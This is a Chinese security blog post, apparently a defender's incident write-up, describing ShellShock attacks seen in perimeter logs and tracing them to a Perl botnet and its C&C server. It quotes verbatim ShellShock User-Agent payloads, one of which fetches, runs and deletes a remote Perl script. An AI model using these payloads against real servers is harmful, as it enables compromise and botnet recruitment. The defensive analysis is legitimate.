@@ -1,0 +1,727 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Lewsic" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.0.1" />
+
+
+
+
+
+
+<meta name="description" content="上个月分析系统日志时，意外发现一例利用BASH ShellShock漏洞的攻击，研究起来挺有趣，写出来做个记录。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="偶遇BASH攻击，险入僵尸网络">
+<meta property="og:url" content="http://yoursite.com/2015/12/01/bash-botnet/index.html">
+<meta property="og:site_name" content="Lewsic">
+<meta property="og:description" content="上个月分析系统日志时，意外发现一例利用BASH ShellShock漏洞的攻击，研究起来挺有趣，写出来做个记录。">
+<meta property="og:image" content="http://ob7tq8bas.bkt.clouddn.com/bash1.jpg">
+<meta property="og:image" content="http://ob7tq8bas.bkt.clouddn.com/bash2.png">
+<meta property="og:updated_time" content="2016-08-06T16:01:37.125Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="偶遇BASH攻击，险入僵尸网络">
+<meta name="twitter:description" content="上个月分析系统日志时，意外发现一例利用BASH ShellShock漏洞的攻击，研究起来挺有趣，写出来做个记录。">
+<meta name="twitter:image" content="http://ob7tq8bas.bkt.clouddn.com/bash1.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Pisces',
+    sidebar: {"position":"left","display":"post"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 0,
+      author: '博主'
+    }
+  };
+</script>
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2015/12/01/bash-botnet/"/>
+
+  <title> 偶遇BASH攻击，险入僵尸网络 | Lewsic </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">Lewsic</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle"></p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                偶遇BASH攻击，险入僵尸网络
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2015-12-01T20:25:13+08:00" content="2015-12-01">
+              2015-12-01
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/安全相关/" itemprop="url" rel="index">
+                    <span itemprop="name">安全相关</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2015/12/01/bash-botnet/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2015/12/01/bash-botnet/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>上个月分析系统日志时，意外发现一例利用BASH ShellShock漏洞的攻击，研究起来挺有趣，写出来做个记录。</p>
+<a id="more"></a>
+<p>每隔几天都会看一看边界安全设备的日志，看看都拦下来哪些攻击，有没有漏掉的。10月12号起，拦截了不少利用BASH ShellShock漏洞的攻击数据。攻击源地址几乎遍布全球，攻击目的地址覆盖了公司公布在互联网的所有业务系统，而且发起的时间没有什么规律。唯一显著的特点是，攻击者在短时间内发起攻击的次数比较多，可以判断肯定不是手工操作的。于是，从攻击频率入手分析，兴许能发现点什么。</p>
+<p>我把所有这个类型的攻击日志按源地址分组后，再按发起时间做了排序，果然发现一个规律。每个攻击IP发起每轮攻击，基本上都以31次为固定频率，每轮平均耗时15秒。</p>
+<p>我又开nmap扫了一下这些攻击源IP，基本上都是世界各地的服务器，跑着各类web应用。按常识，不应该是这些服务器的管理员发起的对我们的攻击，很可能是被黑客当作肉鸡或跳板之后，被黑客当作了攻击工具。</p>
+<p>为了弄清楚攻击的全貌，我在边界设备上开始抓包，希望能从攻击数据包里发现一点有价值的信息。抓到一些pcap包之后，用wireshark打开。</p>
+<p><img src="http://ob7tq8bas.bkt.clouddn.com/bash1.jpg" alt="" title="bash1"></p>
+<p>注意看，在http包里面，ua字段里插入了破壳漏洞的攻击代码：</p>
+<p>() { :;};/usr/bin/perl -e ‘print “Content-Type: text/plain\r\n\r\nXSUCCESS!”;system(“wget -O /dev/null <a href="http://www.testvc.it/TESTONLY" target="_blank" rel="external">http://www.testvc.it/TESTONLY</a>; curl -O /dev/null <a href="http://www.testvc.it/TESTONLY" target="_blank" rel="external">http://www.testvc.it/TESTONLY</a>; fetch <a href="http://www.testvc.it/TESTONLY" target="_blank" rel="external">http://www.testvc.it/TESTONLY</a>; GET <a href="http://www.testvc.it/TESTONLY" target="_blank" rel="external">http://www.testvc.it/TESTONLY</a>; lwp-download <a href="http://www.testvc.it/TESTONLY" target="_blank" rel="external">http://www.testvc.it/TESTONLY</a>; lynx <a href="http://www.testvc.it/TESTONLY" target="_blank" rel="external">http://www.testvc.it/TESTONLY</a>“);’</p>
+<p>另外的一个攻击IP发过来的和这个几乎一模一样：</p>
+<p>() { :;};/usr/bin/perl -e ‘print “Content-Type: text/plain\r\n\r\nXSUCCESS!”;system(“wget <a href="http://tecnoalianza.com/a.log" target="_blank" rel="external">http://tecnoalianza.com/a.log</a> -O /tmp/a.log;curl -O /tmp/a.log <a href="http://tecnoalianza.com/a.log;perl" target="_blank" rel="external">http://tecnoalianza.com/a.log;perl</a> /tmp/a.log;rm -rf /tmp/a.log*”);’</p>
+<p>攻击者如果利用漏洞成功，就会在我的服务器上从指定的服务器下载一份文件到本地，从格式上看，应该是一份用perl写的脚本。然后在服务器运行这段脚本，接着删除掉。攻击代码并不复杂，长度也比较短，利用起来很方便。</p>
+<p>接着，我把<a href="http://tecnoalianza.com/a.log" target="_blank" rel="external">http://tecnoalianza.com/a.log</a> 这份文件下载回来，准备研究一下这个脚本，不出意外的话，应该会是一个小木马。没想到刚下载到就被卡巴斯基识别为病毒文件-_-!!</p>
+<p>打开这份文件，果然是用perl写的代码。从编写习惯来看，作者写代码还是非常规矩的，对齐、注释，一点也不马虎大意。接近1900行代码，因为没学过perl，读起来还是有一点吃力。大致的功能是，连接cc服务器并回传当前服务器的一些基本信息。接着从cc服务器获取指令，包含有一个ip信息。然后针对这个ip发起常见端口扫描、tcpflood、udpflood等等攻击。</p>
+<p>也就是说，如果我的服务器没有打bash的补丁，被shellshock攻击成功后，会下载一个perl脚本，攻击者就可以控制我的服务器，再去攻击其他的计算机。</p>
+<p>在perl脚本里，找到了cc服务器的ip：是乌克兰的213.186.118.35</p>
+<p>忍不住又用nmap看了下大致情况：</p>
+<p><img src="http://ob7tq8bas.bkt.clouddn.com/bash2.png" alt="" title="bash2"></p>
+<p>注意看我红圈标注的内容。有没有很喜感。^_^</p>
+<p>11月中旬以来，类似的攻击突然就销声匿迹了。就好像发起时候来的那般突然。</p>
+<p>总结：</p>
+<p>1.该打补丁的时候千万别懒，今天一偷懒，明天就坑爹。</p>
+<p>2.是时候学学perl了。</p>
+<p>3.如果服务器有杀毒软件，还是可以起到一定作用的。</p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+  <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+    <div>你的打赏，我的干粮</div>
+    <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+      <span>赏</span>
+    </button>
+    <div id="QR" style="display: none;">
+      
+        <div id="wechat" style="display: inline-block">
+          <img id="wechat_qr" src="http://ob7tq8bas.bkt.clouddn.com/erweima.png" alt=" WeChat Pay"/>
+          <p>微信打赏</p>
+        </div>
+      
+      
+    </div>
+  </div>
+
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2015/10/11/twelve-citizen/" rel="next" title="《十二公民》，一部好看的“有教育意义”的片子">
+                <i class="fa fa-chevron-left"></i> 《十二公民》，一部好看的“有教育意义”的片子
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2015/12/31/netscreen/" rel="prev" title="网络安全公司网屏（NetScreen）的研究">
+                网络安全公司网屏（NetScreen）的研究 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div class="ds-thread" data-thread-key="2015/12/01/bash-botnet/"
+           data-title="偶遇BASH攻击，险入僵尸网络" data-url="http://yoursite.com/2015/12/01/bash-botnet/">
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="http://ob7tq8bas.bkt.clouddn.com/blue-lotus.png"
+               alt="" />
+          <p class="site-author-name" itemprop="name"></p>
+          <p class="site-description motion-element" itemprop="description">Lewisec = Lewis & security</p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">84</span>
+              <span class="site-state-item-name">日志</span>
+            </a>
+          </div>
+
+          
+            <div class="site-state-item site-state-categories">
+              <a href="/categories">
+                <span class="site-state-item-count">6</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">205</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/lewisec" target="_blank" title="Github">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  Github
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://twitter.com/__hblf__" target="_blank" title="Twitter">
+                  
+                    <i class="fa fa-fw fa-twitter"></i>
+                  
+                  Twitter
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://weibo.com/1675459885" target="_blank" title="Weibo">
+                  
+                    <i class="fa fa-fw fa-weibo"></i>
+                  
+                  Weibo
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://www.zhihu.com/people/hblf" target="_blank" title="Zhihu">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  Zhihu
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <p class="post-toc-empty">此文章未包含目录</p>
+            
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2016</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder"></span>
+</div>
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Pisces
+  </a>
+</div>
+
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.0.1"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.0.1"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.1"></script>
+
+
+
+  
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"lewis"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.id = 'duoshuo-script';
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+
+  
+    
+    <script src="/vendors/ua-parser-js/dist/ua-parser.min.js?v=0.7.9"></script>
+    <script src="/js/src/hook-duoshuo.js"></script>
+  
+
+
+
+
+
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
